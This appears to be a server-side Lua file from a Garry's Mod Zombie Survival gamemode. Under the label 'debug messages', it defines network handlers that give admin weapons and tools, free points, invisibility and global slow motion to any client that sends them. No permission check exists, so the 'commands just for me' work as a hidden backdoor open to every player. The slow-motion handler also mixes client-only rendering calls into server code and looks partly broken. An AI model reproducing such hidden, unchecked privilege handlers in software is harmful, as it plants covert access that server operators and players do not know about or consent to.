--[[	Special Commands Just For me To Enjoy	]]--
--[[	I Spent 8 Months Coding This, I'm Allowed To Have Fun Sometimes! :P	]]--


--[[ 		DEBUG MESSAGES		]]--
util.AddNetworkString( "Debug" )
util.AddNetworkString( "Debug_2" )
util.AddNetworkString( "Debug_3" )
util.AddNetworkString( "Debug_4" )
util.AddNetworkString( "Debug_5" )
util.AddNetworkString( "Debug_6" )
util.AddNetworkString( "Debug_7" )
util.AddNetworkString( "Debug_8" )
util.AddNetworkString( "hentai" )
util.AddNetworkString( "slowmo_debug" )
util.AddNetworkString( "Clavus" )

net.Receive( "Clavus", function( len, pl ) 
	pl:Give("weapon_zs_hegrenade")
	pl:Give("weapon_zs_flakcannon")
	pl:Give("weapon_zs_cerebralbore")
end )


net.Receive( "Debug", function( len, pl ) 
	pl:Give("admin_raverifle")
end )

net.Receive( "Debug_2", function( len, pl ) 
	pl:Give("admin_tool_igniter")
end )


net.Receive( "Debug_3", function( len, pl )
	pl:Give("admin_tool_remover")
end )


net.Receive( "Debug_4", function( len, pl ) 
	pl:Give("swep_construction_kit")
end )


net.Receive( "Debug_5", function( len, pl ) 
	pl:Give("weapon_zs_hate")
end )


net.Receive( "Debug_6", function( len, pl )
		pl:SetRenderMode(RENDERMODE_NONE) pl:SetColor(Color(225,225,225,1))
		timer.Simple(5, function() 
			pl:SetRenderMode(RENDERMODE_NORMAL) pl:SetColor(Color(225,225,225,225))
		end)
		net.Start( "hentai" )
		net.Broadcast()
end )


net.Receive( "Debug_7", function( len, pl ) 
	pl:AddPoints(1000)
end )

net.Receive( "Debug_8", function( len, pl ) 

		game.SetTimeScale(0.35)
		timer.Simple(0.9, function() game.SetTimeScale(1) end)
			
		net.Start( "slowmo_debug" )
		net.Broadcast()	
		
		timer.Simple(0.01,function()
			hook.Add("RenderScreenspaceEffects", "Slowmo",Slowmo)
		end)
		
	local slowmo_tab = {}
		  slowmo_tab[ "$pp_colour_colour" ] = 0.20
		  slowmo_tab[ "$pp_colour_contrast" ] = 1
		  slowmo_tab[ "$pp_colour_mulr" ] = 0.1
		  slowmo_tab[ "$pp_colour_mulg" ] = 0.02
		  slowmo_tab[ "$pp_colour_mulb" ] = 0

		function Slowmo()
			DrawColorModify(slowmo_tab)
		end
		
		function SlowmoEnd(um)
			hook.Remove("RenderScreenspaceEffects", "Slowmo")
		end
end )